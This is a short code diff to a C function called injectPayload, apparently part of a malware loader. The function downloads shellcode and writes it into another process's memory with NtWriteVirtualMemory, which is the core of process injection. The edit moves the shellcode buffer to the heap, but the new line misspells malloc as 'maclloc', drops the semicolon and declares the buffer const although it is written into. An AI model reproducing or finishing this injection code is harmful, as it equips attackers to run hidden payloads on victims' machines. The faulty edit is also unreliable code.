@@ -25,7 +25,7 @@ BOOL injectPayload() {
     OBJECT_ATTRIBUTES OA;
 
     SIZE_T shellcodeSize = BUFFER_SIZE;
-    unsigned char shellcode[BUFFER_SIZE];
+    const char* shellcode = (const char*)maclloc(BUFFER_SIZE)
 
     if (!downloadPayload(shellcode, shellcodeSize)) {
         return TRUE;
@@ -64,7 +64,7 @@ BOOL injectPayload() {
     }
 
     ULONG oldProtect;
-    Status = NtWriteVirtualMemory(procH, Buffer, &shellcode, shellcodeSize, NULL);
+    Status = NtWriteVirtualMemory(procH, Buffer, shellcode, shellcodeSize, NULL);
     if (STATUS_SUCCESS != Status) {
         State = FALSE; goto CLEANUP;
     }
